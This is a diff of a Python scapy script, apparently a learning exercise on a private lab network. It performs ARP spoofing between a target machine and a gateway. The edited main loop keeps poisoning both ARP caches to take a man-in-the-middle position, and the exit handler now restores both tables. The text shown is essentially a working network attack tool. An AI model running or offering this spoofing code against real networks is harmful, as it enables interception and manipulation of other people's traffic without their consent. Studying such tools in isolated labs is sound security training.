@@ -6,28 +6,33 @@ from scapy.layers.l2 import *
 scapy.conf.verb = 0
 
 def main():
-    packets_sent = 0;
+    target_ip = "172.16.149.129"
+    gateway_ip = "172.16.149.2"
+    packets_sent = 0
     try:
         while True:
-            spoof("172.16.149.129", get_mac("172.16.149.129"), "172.16.149.2")
-            print(get_mac("172.16.149.129"))
-            spoof("172.16.149.2", get_mac("172.16.149.2"), "172.16.149.129")
-            print(get_mac("172.16.149.2"))
+            spoof(target_ip, get_mac(target_ip), gateway_ip)
+            # print(get_mac(target_ip))
+            spoof(gateway_ip, get_mac(gateway_ip), target_ip)
+            # print(get_mac(gateway_ip))
             packets_sent += 2
             print(f"\r[+] Sent {packets_sent} packets", end="")
             sys.stdout.flush()
             time.sleep(2)
     except KeyboardInterrupt:
         # destination is the target machine, source is the router
-        reset("172.16.149.129", "172.16.149.2")
-        print("\n[+] Detected CTRL+C - quitting")
+        reset(target_ip, gateway_ip)
+        # reset the router ARP Table
+        reset(gateway_ip, target_ip)
+        print("\n[+] Detected CTRL+C - quitting.  Resetting ARP tables")
 
 def reset(destination, source):
     # restore the ARP table on target machine
+    # need to set the mac address for the router otherwise it will assume the system running this program is the IP addy
     packet = scapy.ARP(op=2, pdst=destination, hwdst=get_mac(destination), psrc=source, hwsrc=get_mac(source))
-    print(packet.show())
-    print(packet.summary())
-    scapy.send(packet, verbose=False)
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet, count=4, verbose=False)
 
 
 def get_mac(ip):
